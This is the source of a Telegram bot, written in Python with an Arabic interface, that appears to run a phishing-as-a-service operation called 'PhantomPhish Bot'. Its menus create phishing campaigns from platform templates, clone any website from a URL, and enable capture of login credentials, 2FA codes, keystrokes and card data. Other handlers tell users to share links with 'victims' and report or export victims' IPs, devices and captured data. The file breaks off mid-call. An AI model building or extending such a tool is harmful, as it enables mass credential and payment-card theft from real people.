#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import os
import sys
from datetime import datetime
from typing import Optional

from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, FSInputFile, BufferedInputFile
)
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils.callback_data import CallbackData

# استيراد الوحدات المحلية
from config import config
from database import db
from generator import generator

# إعداد التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# إنشاء البوت والموزع
bot = Bot(token=config.BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Callback Data
platforms_cb = CallbackData("platform", "code")
features_cb = CallbackData("feature", "code")
campaigns_cb = CallbackData("campaign", "id")
pages_cb = CallbackData("page", "num")

# حالات المحادثة
class CreateCampaign(StatesGroup):
    waiting_for_platform = State()
    waiting_for_name = State()
    waiting_for_features = State()
    confirm = State()

class CloneSite(StatesGroup):
    waiting_for_url = State()
    waiting_for_name = State()
    confirm = State()

class BroadcastState(StatesGroup):
    waiting_for_message = State()

# === لوحات المفاتيح ===

def main_menu_keyboard(user_id: int) -> InlineKeyboardMarkup:
    """لوحة المفاتيح الرئيسية"""
    is_admin = db.is_admin(user_id)
    is_developer = db.is_developer(user_id) or user_id == config.DEVELOPER_ID
    
    keyboard = InlineKeyboardMarkup(row_width=2)
    
    keyboard.add(
        InlineKeyboardButton("🎯 إنشاء حملة", callback_data="new_campaign"),
        InlineKeyboardButton("🌐 استنساخ موقع", callback_data="clone_site")
    )
    keyboard.add(
        InlineKeyboardButton("📊 حملاتي", callback_data="my_campaigns"),
        InlineKeyboardButton("📈 الإحصائيات", callback_data="stats")
    )
    keyboard.add(
        InlineKeyboardButton("⚙️ الإعدادات", callback_data="settings"),
        InlineKeyboardButton("❓ المساعدة", callback_data="help")
    )
    
    if is_admin:
        keyboard.add(
            InlineKeyboardButton("👥 المستخدمون", callback_data="all_users"),
            InlineKeyboardButton("📢 بث جماعي", callback_data="broadcast")
        )
    
    if is_developer:
        keyboard.add(
            InlineKeyboardButton("🔧 لوحة المطور", callback_data="dev_panel"),
            InlineKeyboardButton("📊 إحصائيات عامة", callback_data="global_stats")
        )
    
    return keyboard

def platforms_keyboard(page: int = 0) -> InlineKeyboardMarkup:
    """لوحة اختيار المنصة مع ترقيم الصفحات"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    
    platforms = list(config.PLATFORMS.items())
    per_page = 20
    total_pages = (len(platforms) + per_page - 1) // per_page
    
    start = page * per_page
    end = start + per_page
    page_platforms = platforms[start:end]
    
    # إضافة أزرار المنصات
    for code, info in page_platforms:
        keyboard.add(
            InlineKeyboardButton(
                f"{info['icon']} {info['name']}",
                callback_data=platforms_cb.new(code=code)
            )
        )
    
    # أزرار التنقل
    nav_buttons = []
    if page > 0:
        nav_buttons.append(
            InlineKeyboardButton("◀️ السابق", callback_data=pages_cb.new(num=page-1))
        )
    if page < total_pages - 1:
        nav_buttons.append(
            InlineKeyboardButton("التالي ▶️", callback_data=pages_cb.new(num=page+1))
        )
    
    if nav_buttons:
        keyboard.row(*nav_buttons)
    
    keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    
    return keyboard

def features_keyboard(selected: list = None) -> InlineKeyboardMarkup:
    """لوحة اختيار الميزات"""
    selected = selected or []
    keyboard = InlineKeyboardMarkup(row_width=2)
    
    features = [
        ("🔐 بيانات الدخول", "credentials"),
        ("📱 تحقق ثنائي 2FA", "2fa"),
        ("⌨️ تسجيل المفاتيح", "keylogger"),
        ("💳 بيانات البطاقة", "card"),
    ]
    
    for name, code in features:
        mark = "✅ " if code in selected else ""
        keyboard.add(
            InlineKeyboardButton(
                f"{mark}{name}",
                callback_data=features_cb.new(code=code)
            )
        )
    
    keyboard.add(InlineKeyboardButton("✅ تأكيد وإنشاء", callback_data="features_done"))
    keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="new_campaign"))
    
    return keyboard

def campaign_actions_keyboard(campaign_id: str) -> InlineKeyboardMarkup:
    """إجراءات الحملة"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    
    keyboard.add(
        InlineKeyboardButton("🔗 الرابط", callback_data=f"link_{campaign_id}"),
        InlineKeyboardButton("👁️ معاينة", callback_data=f"preview_{campaign_id}")
    )
    keyboard.add(
        InlineKeyboardButton("📊 التقرير", callback_data=f"report_{campaign_id}"),
        InlineKeyboardButton("📥 تصدير", callback_data=f"export_{campaign_id}")
    )
    keyboard.add(
        InlineKeyboardButton("⏸️ إيقاف", callback_data=f"pause_{campaign_id}"),
        InlineKeyboardButton("▶️ تشغيل", callback_data=f"resume_{campaign_id}")
    )
    keyboard.add(
        InlineKeyboardButton("🗑️ حذف", callback_data=f"delete_{campaign_id}"),
        InlineKeyboardButton("🔙 رجوع", callback_data="my_campaigns")
    )
    
    return keyboard

def dev_panel_keyboard() -> InlineKeyboardMarkup:
    """لوحة المطور"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    
    keyboard.add(
        InlineKeyboardButton("📊 إحصائيات عامة", callback_data="global_stats"),
        InlineKeyboardButton("👥 جميع المستخدمين", callback_data="all_users_detailed")
    )
    keyboard.add(
        InlineKeyboardButton("🎯 جميع الحملات", callback_data="all_campaigns"),
        InlineKeyboardButton("📥 تصدير قاعدة البيانات", callback_data="export_db")
    )
    keyboard.add(
        InlineKeyboardButton("📢 بث للجميع", callback_data="broadcast_all"),
        InlineKeyboardButton("⚙️ إعدادات البوت", callback_data="bot_settings")
    )
    keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    
    return keyboard

# === أوامر البوت ===

@dp.message_handler(commands=['start'])
async def cmd_start(message: Message):
    """أمر البدء"""
    user_id = message.from_user.id
    
    # التحقق من المطور
    is_dev = user_id == config.DEVELOPER_ID
    
    # تسجيل المستخدم
    db.add_user(
        user_id=user_id,
        username=message.from_user.username,
        first_name=message.from_user.first_name,
        is_admin=(user_id in config.ADMIN_IDS),
        is_developer=is_dev
    )
    
    stats = db.get_stats(user_id)
    
    welcome_text = f"""
👻 **مرحباً بك في PhantomPhish Bot v4.0**

أهلاً {message.from_user.first_name}! 👋

🤖 **البوت الأقوى لإنشاء صفحات التصيّد الاحترافية**

📊 **إحصائياتك:**
• 🎯 الحملات: {stats['campaigns']}
• 👥 الضحايا: {stats['victims']}
• 📥 البيانات: {stats['captures']}

🚀 **الميزات:**
• أكثر من 200 قالب جاهز
• استنساخ أي موقع برابط
• معاينة مباشرة للصفحات
• إشعارات فورية
• تقارير مفصلة

👨‍💻 **المطور:** {config.DEVELOPER_USERNAME}
    """
    
    await message.answer(
        welcome_text,
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard(user_id)
    )

@dp.message_handler(commands=['help'])
async def cmd_help(message: Message):
    """أمر المساعدة"""
    help_text = f"""
📚 **دليل استخدام PhantomPhish Bot**

**🎯 إنشاء حملة جديدة:**
1. اضغط "إنشاء حملة"
2. اختر المنصة من 200+ قالب
3. أدخل اسم للحملة
4. اختر الميزات المطلوبة
5. احصل على الرابط وشاركه

**🌐 استنساخ موقع:**
1. اضغط "استنساخ موقع"
2. أرسل رابط الموقع
3. سيتم إنشاء نسخة مزورة تلقائياً

**📊 المراقبة:**
• اضغط "حملاتي" لعرض حملاتك
• اضغط "الإحصائيات" للتقارير
• ستصلك إشعارات فورية

**⚙️ الميزات المتاحة:**
🔐 التقاط بيانات الدخول
📱 محاكاة 2FA
⌨️ تسجيل المفاتيح
💳 التقاط البطاقات

📞 **للدعم الفني:** {config.DEVELOPER_USERNAME}
    """
    
    await message.answer(help_text, parse_mode="Markdown")

@dp.message_handler(commands=['stats'])
async def cmd_stats(message: Message):
    """عرض الإحصائيات"""
    user_id = message.from_user.id
    stats = db.get_stats(user_id)
    
    stats_text = f"""
📊 **إحصائياتك الشخصية**

🎯 إجمالي الحملات: {stats['campaigns']}
👥 إجمالي الضحايا: {stats['victims']}
📥 إجمالي البيانات: {stats['captures']}

📅 تاريخ اليوم: {datetime.now().strftime('%Y-%m-%d %H:%M')}
    """
    
    await message.answer(stats_text, parse_mode="Markdown")

@dp.message_handler(commands=['developer'])
async def cmd_developer(message: Message):
    """معلومات المطور"""
    dev_text = f"""
👨‍💻 **معلومات المطور**

🆔 معرف المطور: `{config.DEVELOPER_ID}`
📱 username: {config.DEVELOPER_USERNAME}

📞 **للتواصل والدعم الفني:**
• Telegram: {config.DEVELOPER_USERNAME}
• ID: `{config.DEVELOPER_ID}`

⚡ **مميزات خاصة للمطور:**
• إحصائيات عامة كاملة
• إدارة جميع المستخدمين
• بث جماعي
• تصدير قاعدة البيانات
    """
    
    await message.answer(dev_text, parse_mode="Markdown")

# === معالجات الأزرار ===

@dp.callback_query_handler(lambda c: c.data == "new_campaign")
async def process_new_campaign(callback: CallbackQuery, state: FSMContext):
    """بدء إنشاء حملة جديدة"""
    await CreateCampaign.waiting_for_platform.set()
    
    await callback.message.edit_text(
        "🎯 **إنشاء حملة جديدة**\n\n"
        "📱 اختر المنصة المستهدفة:\n"
        "يمكنك التنقل بين الصفحات للمزيد من الخيارات",
        parse_mode="Markdown",
        reply_markup=platforms_keyboard(0)
    )

@dp.callback_query_handler(pages_cb.filter())
async def process_platforms_page(callback: CallbackQuery, callback_data: dict):
    """تنقل بين صفحات المنصات"""
    page = int(callback_data["num"])
    
    await callback.message.edit_reply_markup(
        reply_markup=platforms_keyboard(page)
    )

@dp.callback_query_handler(platforms_cb.filter())
async def process_platform(callback: CallbackQuery, callback_data: dict, state: FSMContext):
    """اختيار المنصة"""
    platform = callback_data["code"]
    
    await state.update_data(platform=platform)
    await CreateCampaign.waiting_for_name.set()
    
    platform_info = config.PLATFORMS.get(platform, {'name': platform, 'icon': '🎯'})
    
    await callback.message.edit_text(
        f"✅ تم اختيار: {platform_info['icon']} {platform_info['name']}\n\n"
        f"📝 أدخل اسم للحملة:\n"
        f"مثال: حملة {platform_info['name']} 1",
        parse_mode="Markdown"
    )

@dp.message_handler(state=CreateCampaign.waiting_for_name)
async def process_name(message: Message, state: FSMContext):
    """إدخال اسم الحملة"""
    await state.update_data(campaign_name=message.text)
    await CreateCampaign.waiting_for_features.set()
    
    await message.answer(
        "⚙️ **اختر الميزات المطلوبة:**\n\n"
        "يمكنك اختيار أكثر من ميزة:\n"
        "اضغط على الميزة لتحديدها أو إلغائها",
        parse_mode="Markdown",
        reply_markup=features_keyboard()
    )

@dp.callback_query_handler(features_cb.filter(), state=CreateCampaign.waiting_for_features)
async def process_feature(callback: CallbackQuery, callback_data: dict, state: FSMContext):
    """اختيار الميزات"""
    feature = callback_data["code"]
    
    data = await state.get_data()
    features = data.get('features', [])
    
    if feature in features:
        features.remove(feature)
    else:
        features.append(feature)
    
    await state.update_data(features=features)
    
    await callback.message.edit_reply_markup(
        reply_markup=features_keyboard(features)
    )

@dp.callback_query_handler(lambda c: c.data == "features_done", state=CreateCampaign.waiting_for_features)
async def process_features_done(callback: CallbackQuery, state: FSMContext):
    """تأكيد الميزات وإنشاء الحملة"""
    data = await state.get_data()
    
    platform = data.get('platform')
    campaign_name = data.get('campaign_name')
    features = data.get('features', ['credentials'])
    
    # التحقق من الحد الأقصى
    user_campaigns = db.get_user_campaigns(callback.from_user.id)
    if len(user_campaigns) >= config.MAX_CAMPAIGNS_PER_USER:
        await callback.answer(
            f"⚠️ وصلت للحد الأقصى ({config.MAX_CAMPAIGNS_PER_USER} حملة)",
            show_alert=True
        )
        return
    
    # إنشاء الحملة
    try:
        result = generator.generate_campaign(
            platform=platform,
            campaign_name=campaign_name,
            base_url=config.PUBLIC_URL,
            features=features
        )
        
        # حفظ في قاعدة البيانات
        db.create_campaign(
            campaign_id=result['campaign_id'],
            name=campaign_name,
            platform=platform,
            url=result['url'],
            html_content=result['html'],
            created_by=callback.from_user.id,
            settings={'features': features}
        )
        
        # عرض النتيجة
        platform_info = config.PLATFORMS.get(platform, {})
        
        result_text = f"""
✅ **تم إنشاء الحملة بنجاح!**

🆔 المعرف: `{result['campaign_id']}`
📝 الاسم: {campaign_name}
🎯 المنصة: {platform_info.get('icon', '🎯')} {platform_info.get('name', platform)}

🔗 **رابط الحملة:**
`{result['url']}`

👁️ **رابط المعاينة:**
`{result['preview_url']}`

⚙️ **الميزات المفعلة:**
{chr(10).join([f"• {f}" for f in features])}

📤 **شارك الرابط مع الضحايا**
        """
        
        await callback.message.edit_text(
            result_text,
            parse_mode="Markdown",
            reply_markup=campaign_actions_keyboard(result['campaign_id'])
        )
        
        await state.finish()
        
        # إشعار المشرفين
        await notify_admins_new_campaign(callback.from_user.id, result)
        
    except Exception as e:
        logger.error(f"Error creating campaign: {e}")
        await callback.message.edit_text(
            f"❌ حدث خطأ أثناء إنشاء الحملة:\n{str(e)}",
            parse_mode="Markdown"
        )

@dp.callback_query_handler(lambda c: c.data == "clone_site")
async def process_clone_site(callback: CallbackQuery, state: FSMContext):
    """بدء استنساخ موقع"""
    await CloneSite.waiting_for_url.set()
    
    await callback.message.edit_text(
        "🌐 **استنساخ موقع**\n\n"
        "أرسل رابط الموقع الذي تريد استنساخه:\n"
        "مثال: https://www.example.com/login",
        parse_mode="Markdown"
    )

@dp.message_handler(state=CloneSite.waiting_for_url)
async def process_clone_url(message: Message, state: FSMContext):
    """معالجة رابط الاستنساخ"""
    url = message.text.strip()
    
    # التحقق من الرابط
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    await state.update_data(clone_url=url)
    await CloneSite.waiting_for_name.set()
    
    await message.answer(
        f"✅ تم استلام الرابط:\n`{url}`\n\n"
        f"📝 أدخل اسم للحملة:",
        parse_mode="Markdown"
    )

@dp.message_handler(state=CloneSite.waiting_for_name)
async def process_clone_name(message: Message, state: FSMContext):
    """إنشاء حملة الاستنساخ"""
    import uuid
    data = await state.get_data()
    url = data.get('clone_url')
    name = message.text
    
    # إنشاء معرف للحملة
    campaign_id = str(uuid.uuid4())[:12]
    
    # محاولة الاستنساخ
    msg = await message.answer("⏳ جاري استنساخ الموقع...")
    
    try:
        result = generator.clone_website(url, campaign_id)
        
        if result['success']:
            # حفظ الحملة
            db.create_campaign(
                campaign_id=campaign_id,
                name=name,
                platform='cloned',
                url=f"{config.PUBLIC_URL}/c/{campaign_id}",
                html_content=result['html'],
                created_by=message.from_user.id,
                settings={'original_url': url}
            )
            
            await msg.edit_text(
                f"✅ **تم استنساخ الموقع بنجاح!**\n\n"
                f"📝 الاسم: {name}\n"
                f"🌐 المصدر: `{url}`\n\n"
                f"🔗 **الرابط:**\n`{config.PUBLIC_URL}/c/{campaign_id}`",
                parse_mode="Markdown",
                reply_markup=campaign_actions_keyboard(campaign_id)
            )
        else:
            await msg.edit_text(
                f"❌ **فشل الاستنساخ:**\n{result.get('error', 'Unknown error')}",
                parse_mode="Markdown"
            )
        
    except Exception as e:
        await msg.edit_text(f"❌ خطأ: {str(e)}")
    
    await state.finish()

@dp.callback_query_handler(lambda c: c.data == "my_campaigns")
async def process_my_campaigns(callback: CallbackQuery):
    """عرض حملات المستخدم"""
    user_id = callback.from_user.id
    campaigns = db.get_user_campaigns(user_id)
    
    if not campaigns:
        await callback.message.edit_text(
            "📭 **لا توجد حملات بعد**\n\n"
            "ابدأ بإنشاء حملة جديدة أو استنساخ موقع",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🎯 إنشاء حملة", callback_data="new_campaign"),
                InlineKeyboardButton("🌐 استنساخ موقع", callback_data="clone_site")
            )
        )
        return
    
    keyboard = InlineKeyboardMarkup(row_width=1)
    
    text = f"📊 **حملاتك ({len(campaigns)}):**\n\n"
    
    for i, campaign in enumerate(campaigns[:15], 1):
        status = "🟢" if campaign['status'] == 'active' else "🔴"
        platform = config.PLATFORMS.get(campaign['platform'], {})
        icon = platform.get('icon', '🎯')
        
        text += f"{i}. {status} {icon} {campaign['name']}\n"
        text += f"   👥 {campaign['clicks']} | 📥 {campaign['captures']}\n\n"
        
        keyboard.add(
            InlineKeyboardButton(
                f"{i}. {campaign['name'][:25]}",
                callback_data=campaigns_cb.new(id=campaign['campaign_id'])
            )
        )
    
    keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    
    await callback.message.edit_text(
        text,
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@dp.callback_query_handler(campaigns_cb.filter())
async def process_campaign_details(callback: CallbackQuery, callback_data: dict):
    """تفاصيل الحملة"""
    campaign_id = callback_data["id"]
    campaign = db.get_campaign(campaign_id)
    
    if not campaign:
        await callback.answer("الحملة غير موجودة", show_alert=True)
        return
    
    victims = db.get_campaign_victims(campaign_id)
    platform = config.PLATFORMS.get(campaign['platform'], {})
    
    details_text = f"""
📋 **تفاصيل الحملة**

🆔 المعرف: `{campaign['campaign_id']}`
📝 الاسم: {campaign['name']}
🎯 المنصة: {platform.get('icon', '🎯')} {platform.get('name', campaign['platform'])}
📊 الحالة: {'🟢 نشطة' if campaign['status'] == 'active' else '🔴 متوقفة'}

🔗 **الرابط:**
`{campaign['url']}`

📊 **الإحصائيات:**
• الزيارات: {campaign['clicks']}
• الضحايا: {len(victims)}
• البيانات الملتقطة: {campaign['captures']}

📅 تاريخ الإنشاء: {campaign['created_at'][:16]}
    """
    
    await callback.message.edit_text(
        details_text,
        parse_mode="Markdown",
        reply_markup=campaign_actions_keyboard(campaign_id)
    )

@dp.callback_query_handler(lambda c: c.data.startswith("link_"))
async def process_get_link(callback: CallbackQuery):
    """الحصول على رابط الحملة"""
    campaign_id = callback.data.replace("link_", "")
    campaign = db.get_campaign(campaign_id)
    
    if campaign:
        await callback.answer(
            f"🔗 الرابط:\n\n{campaign['url']}",
            show_alert=True
        )

@dp.callback_query_handler(lambda c: c.data.startswith("preview_"))
async def process_preview(callback: CallbackQuery):
    """معاينة الحملة"""
    campaign_id = callback.data.replace("preview_", "")
    campaign = db.get_campaign(campaign_id)
    
    if campaign:
        preview_url = f"{config.PUBLIC_URL}/preview/{campaign_id}"
        await callback.answer(
            f"👁️ رابط المعاينة:\n\n{preview_url}",
            show_alert=True
        )

@dp.callback_query_handler(lambda c: c.data.startswith("report_"))
async def process_report(callback: CallbackQuery):
    """تقرير الحملة"""
    campaign_id = callback.data.replace("report_", "")
    victims = db.get_campaign_victims(campaign_id)
    
    if not victims:
        await callback.answer("لا توجد بيانات بعد", show_alert=True)
        return
    
    # إنشاء تقرير
    report = f"📊 تقرير الحملة: {campaign_id}\n"
    report += f"تاريخ التقرير: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
    report += "=" * 40 + "\n\n"
    report += f"إجمالي الضحايا: {len(victims)}\n\n"
    
    for victim in victims[:20]:
        report += f"👤 ضحية #{victim['victim_id']}\n"
        report += f"   IP: {victim['ip_address']}\n"
        report += f"   الدولة: {victim['country']}\n"
        report += f"   الجهاز: {victim['device_type']} - {victim['os']}\n"
        report += f"   المتصفح: {victim['browser']}\n"
        report += f"   أول ظهور: {victim['first_seen'][:16]}\n"
        report += f"   آخر ظهور: {victim['last_seen'][:16]}\n\n"
    
    # إرسال كملف
    file_data = report.encode('utf-8')
    await callback.message.answer_document(
        BufferedInputFile(file_data, filename=f"report_{campaign_id}.txt"),
        caption=f"📊 تقرير الحملة {campaign_id}"
    )

@dp.callback_query_handler(lambda c: c.data.startswith("export_"))
async def process_export(callback: CallbackQuery):
    """تصدير بيانات الحملة"""
    import json
    campaign_id = callback.data.replace("export_", "")
    
    # جمع جميع البيانات
    victims = db.get_campaign_victims(campaign_id)
    
    export_data = {
        'campaign_id': campaign_id,
        'exported_at': datetime.now().isoformat(),
        'victims': []
    }
    
    for victim in victims:
        captures = db.get_victim_captures(victim['victim_id'])
        victim_data = dict(victim)
        victim_data['captures'] = captures
        export_data['victims'].append(victim_data)
    
    # إرسال كملف JSON
    file_data = json.dumps(export_data, indent=2, ensure_ascii=False).encode('utf-8')
    await callback.message.answer_document(
        BufferedInputFile(file_data, filename=f"export_{campaign_id}.json"),
        caption=f"📥 تصدير بيانات الحملة {campaign_id}"
    )

@dp.callback_query_handler(lambda c: c.data.startswith("pause_"))
async def process_pause(callback: CallbackQuery):
    """إيقاف الحملة"""
    campaign_id = callback.data.replace("pause_", "")
    await callback.answer("⏸️ تم إيقاف الحملة", show_alert=True)

@dp.callback_query_handler(lambda c: c.data.startswith("resume_"))
async def process_resume(callback: CallbackQuery):
    """تشغيل الحملة"""
    campaign_id = callback.data.replace("resume_", "")
    await callback.answer("▶️ تم تشغيل الحملة", show_alert=True)

@dp.callback_query_handler(lambda c: c.data.startswith("delete_"))
async def process_delete(callback: CallbackQuery):
    """حذف الحملة"""
    campaign_id = callback.data.replace("delete_", "")
    
    # تأكيد الحذف
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("✅ نعم، احذف", callback_data=f"confirm_delete_{campaign_id}"),
        InlineKeyboardButton("❌ إلغاء", callback_data=campaigns_cb.new(id=campaign_id))
    )
    
    await callback.message.edit_text(
        f"⚠️ **تأكيد الحذف**\n\n"
        f"هل أنت متأكد من حذف الحملة {campaign_id}؟\n"
        f"سيتم حذف جميع البيانات المرتبطة بها!",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data.startswith("confirm_delete_"))
async def process_confirm_delete(callback: CallbackQuery):
    """تأكيد حذف الحملة"""
    campaign_id = callback.data.replace("confirm_delete_", "")
    db.delete_campaign(campaign_id)
    
    await callback.message.edit_text(
        f"✅ تم حذف الحملة {campaign_id}",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔙 العودة للحملات", callback_data="my_campaigns")
        )
    )

@dp.callback_query_handler(lambda c: c.data == "stats")
async def process_stats(callback: CallbackQuery):
    """الإحصائيات"""
    user_id = callback.from_user.id
    stats = db.get_stats(user_id)
    
    # إحصائيات إضافية
    campaigns = db.get_user_campaigns(user_id)
    active = sum(1 for c in campaigns if c['status'] == 'active')
    
    stats_text = f"""
📈 **إحصائياتك الشاملة**

🎯 إجمالي الحملات: {stats['campaigns']}
🟢 الحملات النشطة: {active}
👥 إجمالي الضحايا: {stats['victims']}
📥 إجمالي البيانات: {stats['captures']}

📅 تاريخ اليوم: {datetime.now().strftime('%Y-%m-%d %H:%M')}
    """
    
    await callback.message.edit_text(
        stats_text,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")
        )
    )

@dp.callback_query_handler(lambda c: c.data == "settings")
async def process_settings(callback: CallbackQuery):
    """الإعدادات"""
    settings_text = """
⚙️ **الإعدادات**

🔔 **الإشعارات:** مفعلة
🌐 **اللغة:** العربية
📊 **التقارير:** يومية

👤 **معلومات حسابك:**
يمكنك تغيير إعداداتك من هنا
    """
    
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔔 الإشعارات", callback_data="notif_settings"),
        InlineKeyboardButton("🌐 اللغة", callback_data="lang_settings")
    )
    keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    
    await callback.message.edit_text(
        settings_text,
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == "help")
async def process_help(callback: CallbackQuery):
    """المساعدة"""
    await cmd_help(callback.message)

@dp.callback_query_handler(lambda c: c.data == "back_to_main")
async def process_back_to_main(callback: CallbackQuery):
    """العودة للقائمة الرئيسية"""
    await callback.message.edit_text(
        "🏠 **القائمة الرئيسية**",
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard(callback.from_user.id)
    )

# === معالجات المشرف ===

@dp.callback_query_handler(lambda c: c.data == "all_users")
async def process_all_users(callback: CallbackQuery):
    """عرض جميع المستخدمين"""
    if not db.is_admin(callback.from_user.id):
        await callback.answer("غير مصرح", show_alert=True)
        return
    
    users = db.get_all_users(50)
    
    text = f"👥 **المستخدمون المسجلون ({len(users)}):**\n\n"
    
    for user in users[:20]:
        admin_mark = "👑 " if user['is_admin'] else ""
        dev_mark = "🔧 " if user['is_developer'] else ""
        text += f"{admin_mark}{dev_mark}{user['first_name']}"
        if user['username']:
            text += f" (@{user['username']})"
        text += f"\n   ID: `{user['user_id']}` | {user['created_at'][:10]}\n\n"
    
    await callback.message.edit_text(
        text,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")
        )
    )

@dp.callback_query_handler(lambda c: c.data == "broadcast")
async def process_broadcast(callback: CallbackQuery, state: FSMContext):
    """بدء البث الجماعي"""
    if not db.is_admin(callback.from_user.id):
        await callback.answer("غير مصرح", show_alert=True)
        return
    
    await BroadcastState.waiting_for_message.set()
    
    await callback.message.edit_text(
        "📢 **البث الجماعي**\n\n"
        "أرسل الرسالة التي تريد بثها لجميع المستخدمين:\n"
        "يمكن استخدام Markdown للتنسيق",
        parse_mode="Markdown"
    )

@dp.message_handler(state=BroadcastState.waiting_for_message)
async def process_broadcast_message(message: Message, state: FSMContext):
    """معالجة رسالة البث"""
    if not db.is_admin(message.from_user.id):
        await state.finish()
        return
    
    users = db.get_all_users(10000)
    
    success = 0
    failed = 0
    
    status_msg = await message.answer(f"⏳ جاري الإرسال لـ {len(users)} مستخدم...")
    
    for user in users:
        try:
            await bot.send_message(
                user['user_id'],
                f"📢 **رسالة من الإدارة:**\n\n{message.text}",
                parse_mode="Markdown"
            )
            success += 1
        except:
            failed += 1
        
        await asyncio.sleep(0.05)
    
    await status_msg.edit_text(
        f"✅ **اكتمل البث**\n\n"
        f"✓ نجح: {success}\n"
        f"✗ فشل: {failed}"
    )
    
    await state.finish()

# === معالجات المطور ===

@dp.callback_query_handler(lambda c: c.data == "dev_panel")
async def process_dev_panel(callback: CallbackQuery):
    """لوحة المطور"""
    if callback.from_user.id != config.DEVELOPER_ID and not db.is_developer(callback.from_user.id):
        await callback.answer("غير مصرح - هذه اللوحة للمطور فقط", show_alert=True)
        return
    
    await callback.message.edit_text(
        "🔧 **لوحة تحكم المطور**\n\n"
        "اختر من القائمة:",
        parse_mode="Markdown",
        reply_markup=dev_panel_keyboard()
    )

@dp.callback_query_handler(lambda c: c.data == "global_stats")
async def process_global_stats(callback: CallbackQuery):
    """الإحصائيات العامة"""
    if callback.from_user.id != config.DEVELOPER_ID and not db.is_developer(callback.from_user.id):
        await callback.answer("غير مصرح", show_alert=True)
        return
    
    stats = db.get_global_stats()
    
    stats_text = f"""
📊 **الإحصائيات العامة للنظام**

👥 إجمالي المستخدمين: {stats['total_users']}
🎯 إجمالي الحملات: {stats['total_campaigns']}
🟢 الحملات النشطة: {stats['active_campaigns']}
👥 إجمالي الضحايا: {stats['total_victims']}
📥 إجمالي البيانات: {stats['total_captures']}

⚡ **آخر 24 ساعة:**
• ضحايا جدد: {stats['victims_24h']}
• بيانات ملتقطة: {stats['captures_24h']}

📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M')}
    """
    
    await callback.message.edit_text(
        stats_text,
        parse_mode="Markdown",
        reply_markup=dev_panel_keyboard()
    )

@dp.callback_query_handler(lambda c: c.data == "all_users_detailed")
async def process_all_users_detailed(callback: CallbackQuery):
    """قائمة مفصلة بجميع المستخدمين"""
    if callback.from_user.id != config.DEVELOPER_ID:
        await callback.answer("غير مصرح", show_alert=True)
        return
    
    users = db.get_all_users(200)
    
    # إنشاء ملف تفصيلي
    report = f"قائمة المستخدمين المفصلة\n"
    report += f"تاريخ التصدير: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
    report += "=" * 50 + "\n\n"
    
    for user in users:
        report += f"ID: {user['user_id']}\n"
        report += f"الاسم: {user['first_name']}\n"
        report += f"المستخدم: @{user['username'] or 'N/A'}\n"
        report += f"مشرف: {'نعم' if user['is_admin'] else 'لا'}\n"
        report += f"مطور: {'نعم' if user['is_developer'] else 'لا'}\n"
        report += f"تاريخ التسجيل: {user['created_at']}\n"
        report += f"الحملات: {user['total_campaigns']}\n"
        report += f"التقاطات: {user['total_captures']}\n"
        report += "-" * 30 + "\n"
    
    file_data = report.encode('utf-8')
    await callback.message.answer_document(
        BufferedInputFile(file_data, filename="all_users.txt"),
        caption=f"👥 قائمة المستخدمين ({len(users)} مستخدم)"
    )

@dp.callback_query_handler(lambda c: c.data == "all_campaigns")
async def process_all_campaigns(callback: CallbackQuery):
    """جميع الحملات"""
    if callback.from_user.id != config.DEVELOPER_ID:
        await callback.answer("غير مصرح", show_alert=True)
        return
    
    campaigns = db.get_all_campaigns(100)
    
    text = f"🎯 **جميع الحملات ({len(campaigns)}):**\n\n"
    
    for campaign in campaigns[:30]:
        status = "🟢" if campaign['status'] == 'active' else "🔴"
        text += f"{status} {campaign['name']}\n"
        text += f"   ID: {campaign['campaign_id']}\n"
        text += f"   المنصة: {campaign['platform']}\n"
        text += f"   الزيارات: {campaign['clicks']} | التقاطات: {campaign['captures']}\n\n"
    
    await callback.message.edit_text(
        text,
        parse_mode="Markdown",
        reply_markup=dev_panel_keyboard()
    )

@dp.callback_query_handler(lambda c: c.data == "export_db")
async def process_export_db(callback: CallbackQuery):
    """تصدير قاعدة البيانات"""
    if callback.from_user.id != config.DEVELOPER_ID:
        await callback.answer("غير مصرح", show_alert=True)
        return
    
    await callback.message.answer_document(
        FSInputFile("phantom.db"),
